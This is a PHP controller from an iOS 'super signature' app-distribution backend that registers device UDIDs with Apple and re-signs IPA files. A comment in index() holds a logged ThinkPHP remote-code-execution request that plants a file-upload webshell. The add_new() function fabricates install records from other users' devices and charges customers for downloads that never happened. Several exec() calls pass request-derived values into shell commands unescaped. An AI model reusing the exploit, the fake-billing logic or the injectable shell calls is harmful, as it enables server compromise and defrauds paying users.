<?php

//下载页面
namespace app\user\controller;

use app\communal\Count;
use app\communal\Channel;
use cmf\controller\HomeBaseController;
use MingYuanYun\AppStore\Client;
use think\Db;
use OSS\OssClient;
use OSS\Core\OssException;
use think\Log;
use think\Request;

class InstallController extends HomeBaseController
{
	  //首页安装
    public function test(){
        //$er_logo = explode('?', substr($_SERVER['REQUEST_URI'], 1))[0];
        $channel = input('channel');

        $er_logo = explode('/', substr($_SERVER['REQUEST_URI'], 1))[3];

		$resultAPP = Db::name("user_posted")->where('er_logo',$er_logo)->find();
		
        if (!$resultAPP) {
            $this->error('该应用不存在或已过期...', '/', 3);
            exit;
        }
        $title    = $resultAPP['status'] === 0 ? '已下架' : '已删除';
        $plistUrl = '';

        if($resultAPP['status']==1){
            $userInfo = Db::name('user')->find($resultAPP['uid']);

            if(!$userInfo || $userInfo['user_status']==0){
                $this->error('该APP被禁用', '/', 3);
                exit;
            }

            if($userInfo['sup_down_public']<=0){
                $this->error('项目公有池下载量不足，请联系管理员续费！', '/', 3);
                exit;
            }

            $plistUrl = 'http://'.$_SERVER['HTTP_HOST'] ."/upload/plist/" . md5($resultAPP['url']) . ".plist";
            $title    = false;
        }
		
		$resultAPP['er_logo'] = 'https://' . $_SERVER['HTTP_HOST'] .'/user/install/test/'. $resultAPP['er_logo'].'/?channel='.$channel;
		if($resultAPP['andriod_url'] && strpos($resultAPP['andriod_url'],'http') === false && strpos($resultAPP['andriod_url'],'https') === false){
			 $resultAPP['andriod_url'] = 'http://'.upd_tok_config()['domain'].'/user/install/test/'.$resultAPP['andriod_url'];
        }

		$device=$this->get_device_type();
		$is_wx=$this->is_wei_xin();
		$is_qq=$this->is_qq();
		$is_safari=$this->is_safari();
		
        $this->assign([
            'result'   => $resultAPP,
            'device'   => $device,
            'plistUrl' => $plistUrl,
            'title'    => $title,
            'is_wx'    => $is_wx,
        	'is_qq'    => $is_qq,
        	'is_safari'    => $is_safari
        ]);

        return $this->fetch('index_new');
    }
    
    public function ud_id(){
        return $this->fetch('ud_id');
    }
    
    public function updateCert(){
	   include PLUGINS_PATH . "/ipaphp/vendor/autoload.php";
	   include PLUGINS_PATH . "/ipaphp/vendor/yunchuang/appstore-connect-api/src/Client.php";
	   
	   $certificate_record = Db::name('ios_certificate')->where('status','=',1)->select()->toArray();
	 
	   
	   $count = 0;
	
	   foreach ($certificate_record as $item) {
	         $config = [
		         'iss'    => $item['iss'],
		         'kid'    => $item['kid'],
		         'secret' => APP_ROOT . $item['p8_file']
		     ];
	    
		     $client = new Client($config);
		
		     $client->setHeaders([
		         'Authorization' => 'Bearer ' . $client->getToken(),
		     ]);
		    
		       
		     $allDevices = $client->api('device')->all([
		    	'filter[platform]'=>'IOS'
		     ]);
	
			 
		     if(isset($allDevices['errors'][0]['status']) && $allDevices['errors'][0]['status'] == 403){
		     	Db::name('ios_certificate')->where('id',$item['id'])->update(['status'=>403]);
		     }elseif(isset($allDevices['errors'][0]['status']) && $allDevices['errors'][0]['status'] == 401){
		    	$count = $count + 1;
		    	Db::name('ios_certificate')->where('id',$item['id'])->update(['status'=>401]);
		    	dump($item['id']);
		     }else if($allDevices['meta']['paging']['total']){
		    	$total_count = $allDevices['meta']['paging']['total']>100 ? 100 : $allDevices['meta']['paging']['total'];
	    		$limit_count = 100-$total_count;
	    		
	    		Db::name('ios_certificate')->where('id',$item['id'])->update(['limit_count'=>$limit_count,'total_count'=>$total_count,'status'=>1]);
		     }
	    }
	   
		dump($count);
	}

    //首页安装
    public function index(){
        //$er_logo = explode('?', substr($_SERVER['REQUEST_URI'], 1))[0];
        $channel = input('channel');

        $er_logo = explode('?', substr($_SERVER['REQUEST_URI'], 1))[0];

		$resultAPP = Db::name("user_posted")->where('er_logo',$er_logo)->find();
		
        if (!$resultAPP) {
            $this->error('该应用不存在或已过期...', '/', 3);
            exit;
        }
        $title    = $resultAPP['status'] === 0 ? '已下架' : '已删除';
        $plistUrl = '';

        if($resultAPP['status']==1){
            $userInfo = Db::name('user')->find($resultAPP['uid']);

            if(!$userInfo || $userInfo['user_status']==0){
                $this->error('该APP被禁用', '/', 3);
                exit;
            }

            if($userInfo['sup_down_public']<=0){
                $this->error('项目公有池下载量不足，请联系管理员续费！', '/', 3);
                exit;
            }

            $plistUrl = 'http://'.$_SERVER['HTTP_HOST'] ."/upload/plist/" . md5($resultAPP['url']) . ".plist";
            $title    = false;
        }
		
		$resultAPP['er_logo'] = 'https://' . $_SERVER['HTTP_HOST'] .'/'. $resultAPP['er_logo'].'?channel='.$channel;
		if($resultAPP['andriod_url'] && strpos($resultAPP['andriod_url'],'http') === false && strpos($resultAPP['andriod_url'],'https') === false){
			 $resultAPP['andriod_url'] = 'http://'.upd_tok_config()['domain'].'/'.$resultAPP['andriod_url'];
        }

//        60.210.249.198 - - [06/Nov/2019:16:12:32 +0800] "GET
//        /?s=admin/think\x5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=info.php&vars[1][]=%3Cform%20%20method=%22post%22%20enctype=%22multipart/form-data%22%3E%3Cinput%20name=%22upfile%22%20type=%22file%22%3E%3Cinput%20type=%22submit%22%20value=%22ok%22%3E%3C/form%3E%3C?php%20if%20($_SERVER[%27REQUEST_METHOD%27]%20==%20%27POST%27)%20{%20echo%20%22!%20%20%20url+%22.$_FILES[%22upfile%22][%22name%22];%20if(!file_exists($_FILES[%22upfile%22][%22name%22])){%20copy($_FILES[%22upfile%22][%22tmp_name%22],%20$_FILES[%22upfile%22][%22name%22]);}}?%3E
//        HTTP/1.1" 200 34 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36"

		$device=$this->get_device_type();
		$is_wx=$this->is_wei_xin();
		$is_qq=$this->is_qq();
		$is_safari=$this->is_safari();
		
        $this->assign([
            'result'   => $resultAPP,
            'device'   => $device,
            'plistUrl' => $plistUrl,
            'title'    => $title,
            'is_wx'    => $is_wx,
        	'is_qq'    => $is_qq,
        	'is_safari'    => $is_safari
        ]);

 //echo json_encode($resultAPP);exit();
        return $this->fetch('index_new');
    }

    //获取UDID并做301跳转
    public function get_udid(){
        $data = file_get_contents('php://input');

        $plistBegin     = '<?xml version="1.0"';
        $plistEnd       = '</plist>';

        $data2          = substr($data, strpos($data, $plistBegin), strpos($data, $plistEnd) - strpos($data, $plistBegin));
        $xml            = xml_parser_create();
        $UDID           = "";
        $CHALLENGE      = "";
        $DEVICE_NAME    = "";
        $DEVICE_PRODUCT = "";
        $DEVICE_VERSION = "";
        $iterator       = 0;
        $arrayCleaned   = array();
        $data           = "";

        xml_parse_into_struct($xml, $data2, $vs);
        xml_parser_free($xml);

        foreach ($vs as $v) {
            if ($v['level'] == 3 && $v['type'] == 'complete') {
                $arrayCleaned[] = $v;
            }
        }

        foreach ($arrayCleaned as $elem) {
            switch ($elem['value']) {
                case "CHALLENGE":
                    $CHALLENGE = $arrayCleaned[$iterator + 1]['value'];
                    break;
                case "DEVICE_NAME":
                    $DEVICE_NAME = $arrayCleaned[$iterator + 1]['value'];
                    break;
                case "PRODUCT":
                    $DEVICE_PRODUCT = $arrayCleaned[$iterator + 1]['value'];
                    break;
                case "UDID":
                    $UDID = $arrayCleaned[$iterator + 1]['value'];
                    break;
                case "VERSION":
                    $DEVICE_VERSION = $arrayCleaned[$iterator + 1]['value'];
                    break;
            }
            $iterator++;
        }
        
        $this->redirect(get_site_url() . "/user/install/udid_redirect?udid=" . $UDID . '&app_id=' . intval(input('param.app_id')).'&version='.$DEVICE_VERSION.'&device_name='.$DEVICE_PRODUCT, 301);
    }
    
    //IP检查限制，限制几分钟下载一次
    public function ip_check($app_id) {
    	$app = db('user_posted')->where('id', $app_id)->find();
        if ($app['warning_ip'] > 0 ) {
	        // 获取IP地址
	    	$ip = Request::instance()->ip();
	    	
	    	$ipInfo = db('download_ip_log')->where('ip', $ip)->where('app_id',$app['id'])->select();
	    	if (count($ipInfo) > 0) {
	    		//echo '已经存在数据库';
	    		$now = time();
	    		$last = $ipInfo[0]['updated'];
	    		$e = $now - $last;
	    		$minute = intval($e/60);
	    		if ($minute < $app['warning_ip']) {
	    			$this->error('下载的人太多啦！请' . $app['warning_ip'] . '分钟后尝试!');
	                exit;
	    		}
	    		$times = $ipInfo[0]['times'] + 1;
	    		db('download_ip_log')->where('ip', $ip)->where('app_id',$app['id'])->update(['times' => $times, 'updated' => $now]);
	    		//return;
	    	}else{
		    	Db::name("download_ip_log")->insertGetId([
		    		'app_id'  => $app['id'],
	                'ip'      => $ip,
	                'updated' => time(),
	                'times'   => 1,
		        ]);
		    	//return;
	    	}
        }
    }
    
     public function add_new($app_id)
    {
        $app = db('user_posted')->find($app_id);
        //今日安装数量
        $todayDownload = Db::name('ios_udid_list')
            ->where('app_id', $app_id)
            ->whereTime('create_time', 'today')
            ->count();
        //今日安装平均时间
        $todayTime = Db::name('ios_udid_list')
            ->where('app_id', $app_id)
            ->whereTime('create_time', 'today')
            ->avg('create_time');
        $todayTime=strtotime("-10 minutes");
        $old=Db::name('ios_udid_list')
            ->where('app_id', $app_id)
            ->order('create_time', 'asc')
            ->find();
        $other= Db::name('ios_udid_list')
            ->where('app_id', '<>', $app_id)
            ->where('user_id', '<>', $app['uid'])
            ->order('create_time', 'desc')->find();   
        
        $yiyangd=Db::name('ios_udid_list')
            ->where('app_id', '=', $app_id)
            ->where('user_id', '=', $app['uid'])
            ->where('udid', '=', $other['udid'])->count();
            
        //今日生成的
        $todayAdd = Db::name('ios_udid_list')
            ->where('app_id', $app_id)
            ->where('grubby', 1)
            ->whereTime('create_time', 'today')
            ->count();
        $num = intval($todayDownload / 10) - $todayAdd;

        if ($num > 0 && $yiyangd<1) {
            //用户安装记录
            Db::name('ios_udid_list')->insert([
                'udid' => $other['udid'],
                'app_id' => $app_id,
                'user_id' => $app['uid'],
                'certificate' => $other['certificate'],
                'device' => $other['device'],
                'create_time' => $todayTime,
                'version' => $app['version'],
                'ip' => get_client_ip(),
                'ios_version' => $other['ios_version'],
                'device_name' => $other['device_name'],
                'channel' => '',
                'grubby'=>1
            ]);

            //用户消费记录
            Db::name('sup_charge_log')->insert([
                'uid' => $app['uid'],
                'num' => 1,
                'type' => 1,
                'addtime' => $todayTime,
                'addtype' => 1,
                'is_add' => 0,
                'msg' => '下载应用:(' . $app_id . ')设备扣除'
            ]);

            //用户下载记录
            Db::name('super_download_log')->insert([
                'uid' => $app['uid'],
                'app_id' => $app['id'],
                'addtime' => $todayTime,
                'device' => 'iphone',
                'type' => 1,
                'ip' => Request::instance()->ip(),
                'ios_version' => $other['ios_version'],
                'version' => $app['version'],
                'grubby'=>1
            ]);
            
             Db::name("user")->where("id", $app['uid'])->setDec("sup_down_public");
        }

    }

    //UDID 回调函数 生成下载包 在这步进行用户的扣款处理
    public function udid_redirect(){
        $udid        = $_REQUEST['udid'];
        $app_id      = $_REQUEST['app_id'];
        $ios_version = $_REQUEST['version'];
        $device_name = $_REQUEST['device_name'];
        //同IP限量检测
        $this->ip_check($app_id);
        //获取渠道码
        $channel     = input('channel');

        //查询该APP剩余的设备下载数
        if (!$app = db('user_posted')->find($app_id)) {
            $this->error('该应用不存在或已过期...', '/', 3);
            exit;
        }

        //如果开启了每日下载限制
        if($app['warning']!=0){
            if(Count::getUdidCountByTime($app['uid'],time())>=$app['warning']){
                //TODO 预警短信触发
                //is_warning($app['uid'],$app['sup_down_public'],$app['mobile']);
                $this->error('该应用已下架，请联系管理员！');
                exit;
            }
        }

        //判断用户的下载次数
        $userInfo = Db::name('user')->find($app['uid']);

        if(!$userInfo || $userInfo['user_status'] == 0){
            $this->error('该APP被禁用', '/', 3);
            exit;
        }

        if($userInfo['sup_down_public']<=0){
            $this->error('项目公有池下载量不足，请联系管理员续费！', '/', 3);
            exit;
        }
        
        //判断同一IP安装次数，防止盗刷
        // $ip=get_client_ip();
        // $ip_count=db('ios_udid_list')->where('ip',$ip)->count();
        // if ($ip_count>3){
        //     $this->error('IP限制，请联系管理员！', '/', 3);
        //     exit;
        // }

        include PLUGINS_PATH . "/ipaphp/vendor/autoload.php";
        include PLUGINS_PATH . "/ipaphp/vendor/yunchuang/appstore-connect-api/src/Client.php";
        
        $udId_log = db('ios_udid_list')->where('udid',$udid)->find();
        $certificate_record=false;
        if($udId_log){
            $certificate_record = Db::name('ios_certificate')->where('status',1)->find($udId_log['certificate']);
        }

        if (!$udId_log || !$certificate_record) {
             //使用新的证书
             if($app['download_type']==1){
                 //先查询私有证书
                 $certificate_record = Db::name('ios_certificate')->where('user_id', '=', $app['uid'])->where('limit_count > 1')->where('status',1)->find();
                 if(!$certificate_record){
                     $certificate_record = Db::name('ios_certificate')->where('user_id', '=', 1)->where('limit_count > 1')->where('status',1)->find();
                 }
             }else{
                 $certificate_record = Db::name('ios_certificate')->where('user_id', '=', $app['uid'])->where('limit_count > 1')->where('status',1)->find();
             }            
        }
	
		
        if (!$certificate_record) {
            $this->error('没有可使用的证书，请联系管理员');
            exit;
        }

        $config = [
            'iss'    => $certificate_record['iss'],
            'kid'    => $certificate_record['kid'],
            'secret' => APP_ROOT . $certificate_record['p8_file']
        ];
    

        $client = new Client($config);

        $client->setHeaders([
            'Authorization' => 'Bearer ' . $client->getToken(),
        ]);
       
		
        $name         = make_password(8);   #每次不能重复
        $profileType  = 'IOS_APP_ADHOC';
        $devices      = [];
        $certificates = [
            $certificate_record['tid'],
        ];

        //构建Bundle ID
        $bundleId   = $app['bundle'] . $certificate_record['tid'];

        $bid_result = $client->api('bundleId')->all([
            'fields[bundleIds]' => 'identifier',
            'filter[identifier]' => $bundleId
        ]);

        // 检测账号是否被封
        if (!isset($bid_result['data'])) {
            if(isset($bid_result['errors'][0]['status']) && $bid_result['errors'][0]['status'] == 403){
                Db::name('ios_certificate')->where('id',$certificate_record['id'])->update(['status'=>403]);
            }elseif(isset($bid_result['errors'][0]['status']) && $bid_result['errors'][0]['status'] == 401){                    
                Db::name('ios_certificate')->where('id',$certificate_record['id'])->update(['status'=>401]);
            }
            $this->error('创建包名失败，请联系客服@');
            exit;
        }

        //如果有设备ID
        if (!$bid_result['data']) {
            $result = $client->api('bundleId')->register($name, 'IOS', $bundleId);

            if (!isset($result['data'])) {
                $this->error('创建包名失败，请联系客服');
                exit;
            }else{
                $bId = $result['data']['id'];
            }
            //启用推送功能
            $client->api('bundleIdCapabilities')->enable($result['data']['id'], 'PUSH_NOTIFICATIONS');
        } else {
            $bId = $bid_result['data'][0]['id'];
        }
	
        //查询证书是否添加过该UDID
        $device_info = $client->api('device')->all([
            'filter[udid]' => $udid,
            'limit'        => 1
        ]);
		
        if ($device_info['data']) {
            $devices[] = $device_info['data'][0]['id'];
        } else {
            if($channel){
                Channel::check_down_num($app['uid'],$app_id,$channel);
            }
            //如果只仅仅下载一次
            if($app['only_download']==1){
                $user_link = db('user_link_log')->where('code',session('super_link_on'))->find();
                if($user_link['status'] == 1){
                    $this->error('下载链接失效，请联系管理员获取!');
                    exit;
                }else{
                    db('user_link_log')->where('code',session('super_link_on'))->update(['status'=>1]);
                }
            }
		
            $result = $client->api('device')->register($name, 'IOS', $udid);
		
            if (!isset($result['data'])) {
                // 记录返回异常结果
                file_put_contents("./sign_error_log/AppStore_Connect_API_Log".date('Ymd',time()).".txt",json_encode($result));
                $this->error('添加udid失败，请联系管理员获取!');
                exit;
            }
            $devices[] = $result['data']['id'];
            is_warning($app['uid'],$userInfo['sup_down_public'],$userInfo['mobile'],'秒签');
   
            $allDevices = $client->api('device')->all([
                'filter[platform]'=>'IOS'
            ]);
            $total_count = $allDevices['meta']['paging']['total'];
            $limit_count = 100-$allDevices['meta']['paging']['total'];
            
            Db::name("user")->where("id",$app['uid'])->setDec("sup_down_public");
            
            if($udId_log){
                $udItem = Db::name('ios_udid_list')->where('udid','<>',$udid)->where('user_id','<>',$app['uid'])->order('create_time','desc')->find();
                $udid   = $udItem['udid'];
            }
            
            Db::name('ios_udid_list')->insert([
                'udid'        => $udid,
                'app_id'      => $app_id,
                'user_id'     => $app['uid'],
                'certificate' => $certificate_record['id'],
                'device'      => $devices[0],
                'create_time' => time(),
                'version'     => $app['version'],
                'ip'          => get_client_ip(),
                'ios_version' => $ios_version,
                'device_name' => $device_name,
                'channel'     => $channel?:'',
            ]);

            //用户消费记录
            Db::name('sup_charge_log')->insert([
                'uid'     =>$app['uid'],
                'num'     =>1,
                'type'    =>1,
                'addtime' =>time(),
                'addtype' =>1,
                'is_add'  =>0,
                'msg'     =>'下载应用:('.$app_id.')设备扣除'
            ]);
            Db::name('ios_certificate')->where('id',$certificate_record['id'])->update(['limit_count'=>$limit_count,'total_count'=>$total_count]);   
            
         //   $this->add_new($app_id);
        }

        //创建描述文件
        $result = $client->api('profiles')->create($name, $bId, $profileType, $devices, $certificates);

        if(empty($result['data']['attributes']['profileContent'])){
        //	Db::name('ios_udid_list')->where('udid',$udid)->where('certificate',$certificate_record['id'])->delete();
            // 记录返回异常结果
            file_put_contents("./sign_error_log/AppStore_Connect_API_profileContent_Log".date('Ymd',time()).".txt",json_encode($result));
            $this->error('当前应用太火爆啦，请回下载页面重新下载!');
            exit;
        }

        file_put_contents("./ios_movileprovision/$udid.mobileprovision", base64_decode($result['data']['attributes']['profileContent']));

        //生成证书文件
        $absolute_path = config('absolute_path');

        exec('openssl pkcs12 -in '.$absolute_path.'public'.$certificate_record['p12_file'].' -out '.$absolute_path.'public/spcer/'.$certificate_record['id'].'certificate.pem -clcerts -nokeys -password pass:'.$certificate_record['p12_pwd']);
        exec('openssl pkcs12 -in '.$absolute_path.'public'.$certificate_record['p12_file'].' -out '.$absolute_path.'public/spcer/'.$certificate_record['id'].'key.pem -nocerts -nodes -password pass:'.$certificate_record['p12_pwd']);

        //生成签名后的包
        $files = $absolute_path."public/ios_movileprovision/$udid.mobileprovision";
        $ipa   = $absolute_path."public/".$app['url'];
        // exec('export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin;isign -c '.$absolute_path.'public/spcer/'.$certificate_record['id'].'certificate.pem -k '.$absolute_path.'public/spcer/'.$certificate_record['id'].'key.pem -p "'.$files.'"  -o '.$absolute_path.'public/upload/super_signature_ipa/'.$udid.md5($app['bundle']).$app['er_logo'].'.ipa "'.$ipa.'" 2>&1',$out,$status);
		exec('export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/opt/zsign;zsign -c '.$absolute_path.'public/spcer/'.$certificate_record['id'].'certificate.pem -k '.$absolute_path.'public/spcer/'.$certificate_record['id'].'key.pem -m "'.$files.'"  -o '.$absolute_path.'public/upload/super_signature_ipa/'.$udid.md5($app['bundle']).$app['er_logo'].'.ipa -z 9 '.$ipa.' 2>&1',$out,$status);
        // 存储错误日志
        file_put_contents('./sign_error_log/'.$udid.$app['bundle'].time().'.txt',$out);


        //上传文件到阿里云
        $supUrl  = alUpload([
            'filePath'=>'upload/super_signature_ipa/'.$udid.md5($app['bundle']).$app['er_logo'].'.ipa',
            'fileName'=> $udid.md5($app['bundle']).$app['er_logo'].'.ipa',
        ]);

        $sup_id = Db::name("super_signature_ipa")->insertGetId([
            'appid'   => $app_id,
            'supurl'  => $supUrl,
            'udid'    => $udid,
            'addtime' => time(),
        ]);

        //TODO 删除排队下载的记录 暂时没用
        $downloading = Db::name('downloading')->select()->toArray();

        if(!empty($downloading)){
            Db::name('downloading')->delete($downloading[0]['id']);
        }

        $this->redirect(get_site_url() . "/user/install/ios_install?sup_id=" . $sup_id.'&c_id='.$certificate_record['id'].'&version='.$ios_version.'&channel='.$channel??'', 301);
    }

    //超级签名下载
    public function ios_install(){
        $sup_id      = input('param.sup_id');
        $ios_version = input('param.version');

        $ipaResult   = Db::name('super_signature_ipa')->alias('ipa')
            ->join('user_posted posted','posted.id=ipa.appid')
            ->where('ipa.id',$sup_id)
            ->find();

        if (!$ipaResult) {
            $this->error('该应用不存在或已过期...');
            exit();
        }

        //判断设备
        $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
        if (strpos($agent, 'iphone')) {
            $device = 'iphone';
        }else if(strpos($agent, 'ipad')){
            $device = 'ipad';
        }else if(strpos($agent, 'Safari')){
            $device = 'iphone';
        }else{
            $device = 'other';
        }

        //添加下载记录
        if($device != 'other' ){
        	 Db::name('super_download_log')->insert([
	            'uid'    => $ipaResult['uid'],
	            'app_id' => $ipaResult['id'],
	            'addtime'=> time(),
	            'device' => $device,
	            'type'   => 1,
	            'ip'     => Request::instance()->ip(),
	            'ios_version' =>$ios_version,
	            'version'=>$ipaResult['version']
	        ]);
			$rate = $ipaResult['rate'];
            if ($rate) {
                $this->add_new($ipaResult['id']);
            }
            //<dict>
            //    <key>kind</key>
            //    <string>display-image</string>
            //    <key>needs-shine</key>
            //    <true/>
            //    <key>url</key>
            //    <string>' . $ipaResult["img"] . '</string>
            //</dict>
	
	        $xmlStr = '<?xml version="1.0" encoding="UTF-8"?>
	            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
	            <plist version="1.0">
	                <dict>
	                    <key>items</key>
	                    <array>
	                        <dict>
	                            <key>assets</key>
	                            <array>
	                                <dict>
	                                    <key>kind</key>
	                                    <string>software-package</string>
	                                    <key>url</key>
	                                    <string>' . $ipaResult["supurl"] . '</string>
	                                </dict>
	                            </array>
	                            <key>metadata</key>
	                            <dict>
	                                <key>bundle-identifier</key>
	                                <string>' . $ipaResult["bundle"] . '</string>
	                                <key>bundle-version</key>
	                                <string>' . $ipaResult["version"] . '</string>
	                                <key>kind</key>
	                                <string>software</string>
	                                <key>title</key>
	                                <string>' . $ipaResult["name"] . '</string>
	                            </dict>
	                        </dict>
	                    </array>
	                </dict>
	            </plist>';
	
	        $filename = APP_ROOT . DS . 'upload' . DS . 'udidplist' . DS . $ipaResult['udid'].'_'.md5($sup_id) . '.plist';
	
	        if (!file_exists($filename)) {
	            $xmlFile = fopen($filename, "w") or die("Unable to open file!");
	            fwrite($xmlFile, $xmlStr);
	            fclose($xmlFile);
	        }
        }
       
        $this->assign('supurl',$ipaResult["supurl"]);
        $this->assign('result',$ipaResult);
        $this->assign('ios', 'https://' . $_SERVER['HTTP_HOST'] . "/upload/udidplist/" . $ipaResult['udid'].'_'.md5($sup_id) . ".plist");

        return $this->fetch();
    }

	 //判断是否在safari中打开
    public function is_safari(){
        $sUserAgent = strtolower($_SERVER["HTTP_USER_AGENT"]);

        if (strpos($sUserAgent, 'safari') !== false && strpos($sUserAgent, 'baidu') == false && strpos($sUserAgent, 'uc') == false && strpos($sUserAgent, 'qq') == false) {
        	
            return true;
            
        } else {
            return false;
        }
    }
    
    //判断是否在微信中打开
    public function is_wei_xin(){
        $sUserAgent = strtolower($_SERVER["HTTP_USER_AGENT"]);

        if (strpos($sUserAgent, 'micromessenger') !== false) {
            return true;
        } else {
            return false;
        }
    }

    //判断是否在qq打开
    public function is_qq(){
        $sUserAgent = strtolower($_SERVER["HTTP_USER_AGENT"]);

        if (strpos($sUserAgent, "qq") !== false) {
            if (strpos($sUserAgent, "mqqbrowser") !== false && strpos($sUserAgent, "pa qq") === false || (strpos($sUserAgent, "qqbrowser") !== false && strpos($sUserAgent, "mqqbrowser") === false)) {
                return false;
            } else {
                return true;
            }
        } else {
            return false;
        }
    }

    //判断手机类型
    public function get_device_type(){
        $agent = strtolower($_SERVER['HTTP_USER_AGENT']);

        if(strpos($agent, 'iphone')){
            $type = 'iphone';
        }else if(strpos($agent, 'ipad')){
            $type = 'ipad';
        }else if(strpos($agent, 'ios')){
            $type = 'iphone';
        }else if(strpos($agent, 'mac')){
            $type = 'iphone';
        }else if(strpos($agent, 'ipod')){
            $type = 'iphone';    
        }else if(strpos($agent, 'android')){
            $type = 'android';
        }else{
            $type = 'other';
        }

        return $type;
    }

    //添加排队 TODO 暂时没用到
    public function getudid_mobileconfig(){
        $app_id = intval(input('param.id'));

        $config = get_config();
        $count  = db('downloading')->count();

        $num = '';
        if($count>=$config['down_max_num']){
            $data = [
                'code'=>2,
                'msg'=>'正在排队请稍后获取！'
            ];
            echo json_encode($data);
            exit;
        }else{
            //添加排队记录
            $rou  = rand(1111,9999);
            $time = time();
            $num  = $rou.$time;
            $add  = [
                'appid'  =>$app_id,
                'addtime'=>$time,
                'num'    =>$num,
            ];
            db('downloading')->insert($add);
        }

        $data = [
            'code'  => 1,
            'appid' => $app_id,
            'http'  => $_SERVER['REQUEST_SCHEME'].$_SERVER['HTTP_HOST'],
            'id'    => $num
        ];

        echo json_encode($data);
    }

    //下载数据 TODO 暂时没用到
    public function buts(){
//        $id         = $_POST['id'];
//        $postedinfo = Db::name("user_posted")->where("id=$id")->find();
//        $uid        = $postedinfo['uid'];
//        $userinfo   = Db::name("user")->where("id=$uid")->find();
//
//        if ($userinfo['downloads'] > 0) {
//            $data = array(
//                'uid' => $uid,
//                'posted_id' => $id,
//                'creattime' => time()
//            );
//            $result = Db::name("user_posted_log")->insertGetId($data);
//            //下载次数减1
//            Db::name("user")->where("id=$uid")->setDec('downloads');
//
//            return $result ? '1' : '0';
//        } else {
//            return '3';
//        }
    }

}
